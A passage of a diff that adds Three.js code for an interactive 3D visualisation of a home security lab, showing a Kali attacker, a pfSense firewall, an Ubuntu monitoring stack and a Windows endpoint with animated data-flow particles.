+  base.position.y = 0.04;
+  const screen = new THREE.Mesh(new THREE.BoxGeometry(1.6, 1.0, 0.05), baseMat);
+  screen.position.set(0, 0.58, -0.52);
+  screen.rotation.x = -0.3;
+  g.add(base, screen);
+  return g;
+}
+function makeFallbackServer(color) {
+  const g = new THREE.Group();
+  const mat = new THREE.MeshStandardMaterial({ color, roughness:0.4, metalness:0.9, emissive:color, emissiveIntensity:0.1 });
+  for (let i = 0; i < 3; i++) {
+    const m = new THREE.Mesh(new THREE.BoxGeometry(1.2, 0.25, 0.8), mat);
+    m.position.y = i * 0.32;
+    g.add(m);
+  }
+  return g;
+}
+
+const loader = new THREE.GLTFLoader();
+function loadGLTF(url, onLoad, fallback) {
+  loader.load(url,
+    gltf => onLoad(gltf.scene),
+    undefined,
+    err => {
+      console.warn('GLB not found, using fallback geometry:', url, err.message || err);
+      onLoad(fallback());
+    }
+  );
+}
+
+/* ══════════════════════════════════════════════════════════════════
+   ▌ NODE POSITIONS
+   ══════════════════════════════════════════════════════════════════ */
+const POS = {
+  kali:    new THREE.Vector3(-15, 0, 0),
+  pfsense: new THREE.Vector3(-5, 0, 0),
+  ubuntu:  new THREE.Vector3( 5, 0, 0),
+  win11:   new THREE.Vector3( 15, 0, 0),
+};
+
+/* ══════════════════════════════════════════════════════════════════
+   ▌ NODE 1 — KALI LINUX
+   ══════════════════════════════════════════════════════════════════ */
+let kaliGroup = new THREE.Group();
+kaliGroup.position.copy(POS.kali);
+scene.add(kaliGroup);
+
+let kaliModelWrapper = new THREE.Group();
+kaliGroup.add(kaliModelWrapper);
+
+loadGLTF(KALI_MODEL_URL,
+  model => {
+    model.scale.set(1.2, 1.2, 1.2);
+    model.traverse(c => {
+      if (c.isMesh) {
+        c.castShadow = true;
+        c.material.emissive = new THREE.Color(0x550000);
+        c.material.emissiveIntensity = 0.4;
+      }
+    });
+    kaliModelWrapper.add(model);
+  },
+  () => kaliModelWrapper.add(makeFallbackLaptop(0x880011))
+);
+
+const kaliLabel = makeLabel('Kali Linux (Attacker)\nIP: 10.10.20.10', 'label-attacker');
+kaliLabel.position.set(0, 2.2, 0);
+kaliGroup.add(kaliLabel);
+
+const kaliHitBox = new THREE.Mesh(
+  new THREE.BoxGeometry(2.5, 2.0, 2.0),
+  new THREE.MeshBasicMaterial({ transparent: true, opacity: 0, depthWrite: false })
+);
+kaliHitBox.position.set(0, 0.5, 0);
+kaliGroup.add(kaliHitBox);
+
+/* ══════════════════════════════════════════════════════════════════
+   ▌ NODE 3 — WINDOWS 11
+   ══════════════════════════════════════════════════════════════════ */
+let win11Group = new THREE.Group();
+win11Group.position.copy(POS.win11);
+scene.add(win11Group);
+
+loadGLTF(WIN11_MODEL_URL,
+  model => {
+    model.scale.set(1.2, 1.2, 1.2);
+    model.traverse(c => {
+      if (c.isMesh) {
+        c.castShadow = true;
+        c.material.emissive = new THREE.Color(0x001155);
+        c.material.emissiveIntensity = 0.4;
+      }
+    });
+    win11Group.add(model);
+  },
+  () => makeFallbackLaptop(0x0033aa)
+);
+
+const win11Label = makeLabel('Windows 11 (Endpoint)\nIP: 192.168.50.20', 'label-endpoint');
+win11Label.position.set(0, 2.2, 0);
+win11Group.add(win11Label);
+
+/* ══════════════════════════════════════════════════════════════════
+   ▌ NODE 2 — pfSENSE FIREWALL
+   ══════════════════════════════════════════════════════════════════ */
+let pfGroup = new THREE.Group();
+pfGroup.position.copy(POS.pfsense);
+scene.add(pfGroup);
+
+loadGLTF(PFSENSE_MODEL_URL,
+  model => {
+    model.scale.set(1.0, 1.0, 1.0);
+    model.traverse(c => {
+      if (c.isMesh) {
+        c.castShadow = true;
+        c.material.emissive = new THREE.Color(0x331100);
+        c.material.emissiveIntensity = 0.3;
+      }
+    });
+    pfGroup.add(model);
+  },
+  () => makeFallbackServer(0xaa4400)
+);
+
+const pfLabel = makeLabel('pfSense Firewall\nWAN: 10.10.20.1\nLAN: 10.10.30.254', 'label-firewall');
+pfLabel.position.set(0, 3.0, 0);
+pfGroup.add(pfLabel);
+
+
+/* ══════════════════════════════════════════════════════════════════
+   ▌ NODE 4 — UBUNTU STACK
+   ══════════════════════════════════════════════════════════════════ */
+const LAYERS = [
+  { name: 'Python SOAR Engine', color: 0x00cc44, emissive: 0x003311 },
+  { name: 'Zeek (NetMonitor)',   color: 0x00aaff, emissive: 0x001133 },
+  { name: 'Suricata (IDS/IPS)',  color: 0xffaa00, emissive: 0x221100 },
+  { name: 'Vector (Log Router)', color: 0xaa44ff, emissive: 0x110022 },
+  { name: 'Splunk (SIEM)',       color: 0xff3344, emissive: 0x220011 },
+];
+const LAYER_H   = 0.18;
+const LAYER_GAP = 0.04;
+const LAYER_W   = 1.5;
+const LAYER_D   = 1.0;
+
+const ubuntuGroup = new THREE.Group();
+ubuntuGroup.position.copy(POS.ubuntu);
+scene.add(ubuntuGroup);
+
+const layerMeshes = [];
+const layerBaseY  = []; 
+const layerLabelObjects = []; 
+
+LAYERS.forEach((l, i) => {
+  const geo = new THREE.BoxGeometry(LAYER_W, LAYER_H, LAYER_D);
+  const mat = new THREE.MeshStandardMaterial({
+    color: l.color, roughness: 0.3, metalness: 0.7,
+    emissive: l.emissive, emissiveIntensity: 0.8,
+    transparent: true, opacity: 0.92
+  });
+  const mesh = new THREE.Mesh(geo, mat);
+  const y = i * (LAYER_H + LAYER_GAP) + LAYER_H / 2;
+  mesh.position.y = y;
+  mesh.castShadow = true;
+  mesh.receiveShadow = true;
+  mesh.userData.layerIndex = i;
+  mesh.userData.restY = y;
+  layerBaseY.push(y);
+  ubuntuGroup.add(mesh);
+  layerMeshes.push(mesh);
+
+  const lDiv = document.createElement('div');
+  lDiv.style.cssText = `
+    font-size: 12px; font-weight: bold; color: #${l.color.toString(16).padStart(6,'0')};
+    background: rgba(5,10,20,0.85); padding: 6px 12px;
+    border-radius: 4px; pointer-events:none; white-space:nowrap;
+    text-shadow: 0 0 10px currentColor;
+    border-left: 3px solid #${l.color.toString(16).padStart(6,'0')};
+    box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+    opacity: 0;
+    visibility: hidden;
+    transition: opacity 0.4s ease;
+  `;
+  lDiv.textContent = l.name;
+  const lObj = new THREE.CSS2DObject(lDiv);
+  lObj.position.set(LAYER_W / 2 + 1.2, 0, 0); 
+  mesh.add(lObj);
+  layerLabelObjects.push({ obj: lObj, div: lDiv });
+  ALL_LABELS.push({ div: lDiv, obj: lObj, basePx: 12 });
+});
+
+const ubuntuTopY = LAYERS.length * (LAYER_H + LAYER_GAP);
+const ubuntuLabel = makeLabel('Ubuntu\nIP: 10.10.30.1', 'label-ubuntu');
+ubuntuLabel.position.set(0, ubuntuTopY + 0.5, 0);
+ubuntuGroup.add(ubuntuLabel);
+
+const ubuntuHitBox = new THREE.Mesh(
+  new THREE.BoxGeometry(LAYER_W + 0.2, ubuntuTopY + 0.2, LAYER_D + 0.2),
+  new THREE.MeshBasicMaterial({ visible: false })
+);
+ubuntuHitBox.position.y = (ubuntuTopY) / 2;
+ubuntuGroup.add(ubuntuHitBox);
+
+/* ══════════════════════════════════════════════════════════════════
+   ▌ EXPLODE / COLLAPSE ANIMATION
+   ══════════════════════════════════════════════════════════════════ */
+let exploded = false;
+const EXPLODE_SPREAD = 1.5;
+
+const camState = {
+  overview:   { pos: new THREE.Vector3(0, 16, 35), target: new THREE.Vector3(0, 1, 0) },
+  zoomed:     { pos: new THREE.Vector3(5, 5, 10),  target: new THREE.Vector3(5, 2, 0) },
+  attackView: { pos: new THREE.Vector3(-26, 10, 8), target: new THREE.Vector3(5, 1, 0) } 
+};
+
+function tweenCamera(to) {
+  new TWEEN.Tween(camera.position)
+    .to({ x: to.pos.x, y: to.pos.y, z: to.pos.z }, 1200)
+    .easing(TWEEN.Easing.Cubic.InOut)
+    .start();
+  new TWEEN.Tween(controls.target)
+    .to({ x: to.target.x, y: to.target.y, z: to.target.z }, 1200)
+    .easing(TWEEN.Easing.Cubic.InOut)
+    .start();
+}
+
+function explodeLayers() {
+  ubuntuLabel.element.style.opacity = '0';
+  setTimeout(() => { ubuntuLabel.element.style.visibility = 'hidden'; }, 400);
+
+  layerMeshes.forEach((m, i) => {
+    const targetY = layerBaseY[i] + i * EXPLODE_SPREAD;
+    new TWEEN.Tween(m.position)
+      .to({ y: targetY }, 900)
+      .easing(TWEEN.Easing.Back.Out)
+      .onComplete(() => {
+        layerLabelObjects[i].div.style.visibility = 'visible';
+        layerLabelObjects[i].div.style.opacity = '1';
+      })
+      .start();
+  });
+  controls.maxDistance = 100;
+  tweenCamera(camState.zoomed);
+  exploded = true;
+  document.getElementById('tip').textContent = '🖱 RIGHT CLICK AND DRAG TO PAN | CLICK UBUNTU AGAIN TO COLLAPSE';
+}
+
+function collapseLayers() {
+  ubuntuLabel.element.style.visibility = 'visible';
+  ubuntuLabel.element.style.opacity = '1';
+
+  layerLabelObjects.forEach(l => { 
+    l.div.style.opacity = '0'; 
+    setTimeout(() => { l.div.style.visibility = 'hidden'; }, 400); 
+  });
+  
+  layerMeshes.forEach((m, i) => {
+    new TWEEN.Tween(m.position)
+      .to({ y: layerBaseY[i] }, 700)
+      .easing(TWEEN.Easing.Cubic.InOut)
+      .start();
+  });
+  controls.maxDistance = 80;
+  tweenCamera(camState.overview);
+  exploded = false;
+  document.getElementById('tip').textContent = '🖱 CLICK UBUNTU TO VIEW STACK | CLICK KALI TO VIEW ATTACK CHAIN SUMMARY';
+}
+
+/* ══════════════════════════════════════════════════════════════════
+   ▌ DATA FLOW / CURVES
+   ══════════════════════════════════════════════════════════════════ */
+function createParticleTextureDataFlow() {
+  const canvas = document.createElement('canvas');
+  canvas.width = 64; canvas.height = 64;
+  const ctx = canvas.getContext('2d');
+  
+  const grad = ctx.createRadialGradient(32, 32, 0, 32, 32, 32);
+  grad.addColorStop(0, 'rgba(255, 255, 255, 1)');
+  grad.addColorStop(0.2, 'rgba(255, 255, 255, 0.8)');
+  grad.addColorStop(0.5, 'rgba(255, 255, 255, 0.2)');
+  grad.addColorStop(1, 'rgba(0, 0, 0, 0)');
+  
+  ctx.fillStyle = grad;
+  ctx.fillRect(0, 0, 64, 64);
+  return new THREE.CanvasTexture(canvas);
+}
+const orbTextureFlow = createParticleTextureDataFlow();
+
+function buildStream(colorHex, particleSize, packetCount, pointsPerPacket) {
+  const pCount = packetCount || 3;
+  const pLength = pointsPerPacket || 15;
+  const N = pCount * pLength;
+  const positions = new Float32Array(N * 3);
+  const colors = new Float32Array(N * 3);
+  const baseColor = new THREE.Color(colorHex);
+
+  const geo = new THREE.BufferGeometry();
+  geo.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+  geo.setAttribute('color', new THREE.BufferAttribute(colors, 3));
+
+  const mat = new THREE.PointsMaterial({
+    size: particleSize || 0.5, 
+    map: orbTextureFlow,           
+    transparent: true, 
+    opacity: 0.95,
+    depthWrite: false, 
+    blending: THREE.AdditiveBlending, 
+    vertexColors: true
+  });
+  const pts = new THREE.Points(geo, mat);
+  scene.add(pts);
+
+  const offsets = new Float32Array(N);
+  let idx = 0;
+  for (let i = 0; i < pCount; i++) {
+    const packetBase = i / pCount; 
+    for (let j = 0; j < pLength; j++) {
+      offsets[idx] = packetBase - j * 0.008; 
+      const fade = Math.pow(1.0 - (j / (pLength - 1)), 1.5); 
+      const c = baseColor.clone().multiplyScalar(fade);
+      if (j === 0 || j === 1 || j === 2) c.lerp(new THREE.Color(0xffffff), 0.8); 
+      colors[idx*3+0] = c.r; colors[idx*3+1] = c.g; colors[idx*3+2] = c.b;
+      idx++;
+    }
+  }
+  return { geo, offsets, pts, N };
+}
+
+const s1 = buildStream(0xff4d4d, 0.8, 5, 25); 
+const s2 = buildStream(0xffaa00, 0.5, 4, 18); 
+const s3 = buildStream(0x00aaff, 0.5, 4, 18); 
+const s4 = buildStream(0xff3344, 0.5, 4, 18); 
+const s5 = buildStream(0x00cc44, 0.5, 4, 18); 
+
+const s6 = buildStream(0xffaa00, 0.4, 3, 15); 
+const s7 = buildStream(0x00aaff, 0.4, 3, 15); 
+const s8 = buildStream(0xaa44ff, 0.4, 3, 15); 
+
+function getWP(idx) {
+  const v = new THREE.Vector3();
+  layerMeshes[idx].getWorldPosition(v);
+  return v;
+}
+
+function getCurve1() {
+  const wpSuricata = getWP(2); 
+  return new THREE.CatmullRomCurve3([
+    new THREE.Vector3(-15, 0.8, 0.3),  
+    new THREE.Vector3(-10, 4.0, 1.5),  
+    new THREE.Vector3(-5, 1.5, 0.5),   
+    new THREE.Vector3(0, 2.5, 0),      
+    wpSuricata,                        
+    new THREE.Vector3(10, 3.0, 0),     
+    new THREE.Vector3(15, 0.9, -0.3)   
+  ]);
+}
+function getCurve2() {
+  const wp = getWP(2);
+  return new THREE.CatmullRomCurve3([
+    new THREE.Vector3(-5, 1.4, -0.4), new THREE.Vector3(0, 2.5, -1.2), wp,
+  ]);
+}
+function getCurve3() {
+  const wp = getWP(1);
+  return new THREE.CatmullRomCurve3([
+    new THREE.Vector3(-5, 1.0, 0.5), new THREE.Vector3(0, 1.8, 1.5), wp,
+  ]);
+}
+function getCurve4() {
+  const wp = getWP(4);
+  return new THREE.CatmullRomCurve3([
+    new THREE.Vector3(15, 0.9, -0.3), new THREE.Vector3(11, 4.5, -1.5), new THREE.Vector3(8, 4.5, -1.0), wp,
+  ]);
+}
+function getCurve5() {
+  const wp = getWP(0);
+  return new THREE.CatmullRomCurve3([
+    new THREE.Vector3(-5, 0.5, 0.6), new THREE.Vector3(0, 1.0, 1.8), wp,
+  ]);
+}
+function getCurve6() {
+  const src = getWP(2), dst = getWP(3);
+  return new THREE.CatmullRomCurve3([
+    new THREE.Vector3(src.x - 0.3, src.y, src.z - 0.3),
+    new THREE.Vector3(src.x - 0.4, (src.y+dst.y)/2, src.z - 0.5),
+    new THREE.Vector3(dst.x - 0.3, dst.y, dst.z - 0.3),
+  ]);
+}
+function getCurve7() {
+  const src = getWP(1), dst = getWP(3);
+  return new THREE.CatmullRomCurve3([
+    new THREE.Vector3(src.x + 0.3, src.y, src.z + 0.3),
+    new THREE.Vector3(src.x + 0.5, (src.y+dst.y)/2, src.z + 0.5),
+    new THREE.Vector3(dst.x + 0.3, dst.y, dst.z + 0.3),
+  ]);
+}
+function getCurve8() {
+  const src = getWP(3), dst = getWP(4);
+  return new THREE.CatmullRomCurve3([
+    src, new THREE.Vector3(src.x + 0.5, (src.y+dst.y)/2, src.z), dst,
+  ]);
+}
+
+function updateStream(s, curve, speed) {
+  const pos = s.geo.attributes.position.array;
+  for (let i = 0; i < s.N; i++) {
+    s.offsets[i] += speed;
+    let t = s.offsets[i] % 1.0; 
+    if (t < 0) t += 1.0; 
+    const p = curve.getPoint(t);
+    pos[i*3+0] = p.x; pos[i*3+1] = p.y; pos[i*3+2] = p.z;
+  }
+  s.geo.attributes.position.needsUpdate = true;
+}
+
+/* ══════════════════════════════════════════════════════════════════
+   ▌ RAYCASTER / CLICK INTERACTION
+   ══════════════════════════════════════════════════════════════════ */
+const raycaster = new THREE.Raycaster();
+const mouse = new THREE.Vector2();
+
+renderer.domElement.addEventListener('click', e => {
+  if (attackPanelOpen) return; 
+
+  const rect = renderer.domElement.getBoundingClientRect();
+  mouse.x =  ((e.clientX - rect.left)  / rect.width)  * 2 - 1;
+  mouse.y = -((e.clientY - rect.top)   / rect.height) * 2 + 1;
+  raycaster.setFromCamera(mouse, camera);
+
+  const hitsKali = raycaster.intersectObjects([kaliHitBox], false);
+  if (hitsKali.length > 0) {
+    tweenCamera(camState.attackView);
+    setTimeout(() => {
+      openAttackPanel();
+      if (!fullChainOpen) toggleFullChain(); 
+    }, 600);
+    return;
+  }
+
+  const targets = [ubuntuHitBox, ...layerMeshes];
+  const hits = raycaster.intersectObjects(targets, false);
+  if (hits.length > 0) {
+    exploded ? collapseLayers() : explodeLayers();
+  }
+});
+
+renderer.domElement.addEventListener('mousemove', e => {
+  const rect = renderer.domElement.getBoundingClientRect();
+  mouse.x =  ((e.clientX - rect.left)  / rect.width)  * 2 - 1;
+  mouse.y = -((e.clientY - rect.top)   / rect.height) * 2 + 1;
+  raycaster.setFromCamera(mouse, camera);
+
+  const hits = raycaster.intersectObjects([...layerMeshes, kaliHitBox], false);
+  renderer.domElement.style.cursor = hits.length ? 'pointer' : 'default';
+});
+
+// WASD Keys for Pan
+const keyState = {};
+window.addEventListener('keydown', e => { keyState[e.code] = true; });
+window.addEventListener('keyup',   e => { keyState[e.code] = false; });
+function applyKeyboardPan() {
+  const speed = 0.1;
+  const forward = new THREE.Vector3();
+  camera.getWorldDirection(forward);
+  forward.y = 0; forward.normalize();
+  const right = new THREE.Vector3();
+  right.crossVectors(forward, new THREE.Vector3(0,1,0)).normalize();
+
+  if (keyState['KeyW'] || keyState['ArrowUp'])    { camera.position.addScaledVector(forward,  speed); controls.target.addScaledVector(forward,  speed); }
+  if (keyState['KeyS'] || keyState['ArrowDown'])  { camera.position.addScaledVector(forward, -speed); controls.target.addScaledVector(forward, -speed); }
+  if (keyState['KeyA'] || keyState['ArrowLeft'])  { camera.position.addScaledVector(right,   -speed); controls.target.addScaledVector(right,   -speed); }
+  if (keyState['KeyD'] || keyState['ArrowRight']) { camera.position.addScaledVector(right,    speed); controls.target.addScaledVector(right,    speed); }
+  if (keyState['KeyQ'] || keyState['PageDown'])   { camera.position.y -= speed; controls.target.y -= speed; }
+  if (keyState['KeyE'] || keyState['PageUp'])     { camera.position.y += speed; controls.target.y += speed; }
+}
+
+window.addEventListener('resize', () => {
+  const w = window.innerWidth, h = window.innerHeight;
+  camera.aspect = w / h;
+  camera.updateProjectionMatrix();
+  renderer.setSize(w, h);
+  labelRenderer.setSize(w, h);
+});
+
+const clock = new THREE.Clock();
+
+function animate() {
+  requestAnimationFrame(animate);
+  const t = clock.getElapsedTime();
+
+  TWEEN.update();
+  applyKeyboardPan();
+  controls.update();
+
+  // --- Animation cho Blobs (Loang màu) ---
+  const bp = blobGeo.attributes.position.array;
+  const bc = blobGeo.attributes.color.array;
+  for(let i=0; i<blobCount; i++) {
+      bp[i*3+0] += Math.sin(t * 0.2 + bPhase[i]) * 0.04;
+      bp[i*3+1] += Math.cos(t * 0.15 + bPhase[i]) * 0.04;
+      
+      let fade = (Math.sin(t * 0.8 + bPhase[i]) + 1) * 0.5; 
+      fade = fade * 0.8 + 0.2; // Opacity dao động từ 20% đến 100%
+      bc[i*3+0] = bBaseCol[i*3+0] * fade;
+      bc[i*3+1] = bBaseCol[i*3+1] * fade;
+      bc[i*3+2] = bBaseCol[i*3+2] * fade;
+  }
+  blobGeo.attributes.position.needsUpdate = true;
+  blobGeo.attributes.color.needsUpdate = true;
+
+  // --- Animation cho Bubbles (Bong bóng trôi) ---
+  const bup = bubGeo.attributes.position.array;
+  const buc = bubGeo.attributes.color.array;
+  for(let i=0; i<bubCount; i++) {
+      bup[i*3+1] += bubSpeed[i]; 
+      bup[i*3+0] += Math.sin(t * 1.5 + bubPhase[i]) * 0.02; 
+      
+      if(bup[i*3+1] > 60) {
+          bup[i*3+1] = -40; // Reset lại khi bay quá cao
+      }
+      
+      let fade = (Math.sin(t * 2.0 + bubPhase[i]) + 1) * 0.5;
+      const y = bup[i*3+1];
+      let edgeFade = 1.0;
+      if(y > 40) edgeFade = (60 - y) / 20;
+      else if (y < -20) edgeFade = (y + 40) / 20;
+      
+      fade *= edgeFade;
+
+      buc[i*3+0] = bubBaseCol[i*3+0] * fade;
+      buc[i*3+1] = bubBaseCol[i*3+1] * fade;
+      buc[i*3+2] = bubBaseCol[i*3+2] * fade;
+  }
+  bubGeo.attributes.position.needsUpdate = true;
+  bubGeo.attributes.color.needsUpdate = true;
+
+  updateStream(s1, getCurve1(), 0.0025);
+  updateStream(s2, getCurve2(), 0.0038);
+  updateStream(s3, getCurve3(), 0.0035);
+  updateStream(s4, getCurve4(), 0.0045);
+  updateStream(s5, getCurve5(), 0.0030);
+  updateStream(s6, getCurve6(), 0.0065);
+  updateStream(s7, getCurve7(), 0.0060);
+  updateStream(s8, getCurve8(), 0.0075);
+  scaleAllLabels();
+
+  if (kaliGroup)  kaliGroup.position.y  = Math.sin(t * 0.9)        * 0.08;
+  if (win11Group) win11Group.position.y = Math.sin(t * 0.9 + 1)    * 0.08;
+  if (pfGroup)    pfGroup.position.y    = Math.sin(t * 0.7 + 0.5)  * 0.06;
+
+  renderer.render(scene, camera);
+  labelRenderer.render(scene, camera);
+}
+
+animate();
+</script>
+</body>
+</html>
